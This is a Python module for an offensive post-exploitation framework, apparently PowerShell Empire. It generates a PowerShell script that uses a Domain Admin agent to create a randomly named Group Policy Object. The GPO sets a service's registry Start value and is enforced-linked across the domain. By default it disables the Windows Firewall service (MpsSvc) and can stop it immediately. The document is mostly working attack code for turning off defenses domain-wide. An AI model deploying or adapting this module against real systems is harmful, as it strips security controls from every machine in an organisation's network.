from lib.common import helpers


class Module:

    def __init__(self, mainMenu, params=[]):

        # Metadata info about the module, not modified during runtime
        self.info = {
            # Name for the module that will appear in module menus
            'Name': 'Set-GpServiceStatus',

            # List of one or more authors for the module
            'Author': ['Yves Kraft (@nrx_ch)', 'Immanuel Willi'],

            # More verbose multi-line description of the module
            'Description': ("This module is intended to set a startup mode for a given service using Group Policy Objects (GPO). "
                            "ServiceStatus parameter will be written as DWord into the registry to alter the service status. "
                            "It creates a new (or modifies an existing) GPO on the Domain Controller. "
                            "Options for linking and enabling GPOs can be provided if required. "
                            "Requirements: This module needs Domain Admin privileges, and needs to be run against a Domain Controller!"),

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : None,

            # True if the module needs admin rights to run
            'NeedsAdmin' : True,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,

            # The minimum PowerShell version needed for the module to run
            'MinLanguageVersion' : '2',
        }


        # Any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent with Domain Admin privileges on a Domain Controller.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'ServiceName' : {
                'Description'   :   'Service name of the service to modify (e.g. MpsSvc to disable the firewall service)',
                'Required'      :   True,
                'Value'         :   'MpsSvc'
            },
            'GpoName' : {
                'Description'   :   'Either the module creates a new GPO with the given name, or extends an existing GPO (i.e. "Default Domain Policy"). The default value is a random string.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ServiceStatus' : {
                'Description'   :   'Status to set for the service. Accepted values are: "1" = Start Automatic (Delayed Start), "2" = Start Automatic, "3" = Start Manual, "4" = Disabled',
                'Required'      :   True,
                'Value'         :   '4'
            },
            'ImmediatelyStartStopService' : {
                'Description'   :   'Immediately start/stop service. Accepted values are "yes" or "no". If "yes" the affected service will be started/stopped immediately. Otherwise the system must be restarted.',
                'Required'      :   False,
                'Value'         :   'no'
            },
            'LinkGpo' : {
                'Description'   :   'Link the GPO to a site, domain or organizational unit (OU). Accepted values are "yes" or "no".',
                'Required'      :   False,
                'Value'         :   'yes'
            },
            'LinkEnableGpo' : {
                'Description'   :   'Specifies whether the GPO link is enabled. Possible values are "yes" or "no".',
                'Required'      :   False,
                'Value'         :   'Yes'
            },
            'ADSpath' : {
                'Description'   :   'Specify the LDAP distinguished name of the site, domain or OU to which to link the GPO (e.g. for corp.com, the LDAP distinguished name is "DC=corp,DC=com)".',
                'Required'      :   True,
                'Value'         :   '"DC=corp,DC=com"'
            }

        }

        # Save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # Parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self):
        # The PowerShell script itself, with the command to invoke
        #   for execution appended to the end. Scripts should output
        #   everything to the pipeline for proper parsing.
        #
        # The script should be stripped of comments, with a link to any
        #   original reference script included in the comments.
        moduleName = self.info["Name"]

        script = """
Function Set-GpServiceStatus
{
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $False)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [String]
        $GpoName,

        [String]
        $ServiceName,

        [Int]
        $ServiceStatus,

        [String]
        $ImmediatelyStartStopService,

        [String]
        $LinkGpo,

        [String]
        $LinkEnableGpo,

        [String]
        $ADSpath)

    if ($GpoName -eq ""){
        $GpoName=(([char[]]([char]'a'..[char]'z') + 0..9 | sort {get-random})[0..31] -join '')
    }

    New-GPO -Name "$GpoName"

    #Startup Types
    #1 = Start Automatic (Delayed Start)
    #2 = Start Automatic
    #3 = Start Manual
    #4 = Disabled

    GroupPolicy\Set-GPRegistryValue -Name $GpoName -Key "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\$ServiceName" -ValueName Start -Type DWord  -value $ServiceStatus
    if ($LinkGpo.ToLower() -eq "yes"){
        New-GPLink -Name $GpoName -Target $ADSpath -Enforced Yes -LinkEnabled $LinkEnableGpo
    }

    if ($ImmediatelyStartStopService.ToLower() -eq "yes"){
        if ($ServiceStatus -eq 4){
            Stop-Service $ServiceName
            }
        else {
            Start-Service $ServiceName
            }
    }
}

Set-GpServiceStatus"""

        # Add any arguments to the end execution of the script
        for option, values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # If we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values['Value'])
        script += ' | Out-String | %{$_ + \"`n\"};"`n' + str(moduleName) + ' completed!"'

        return script
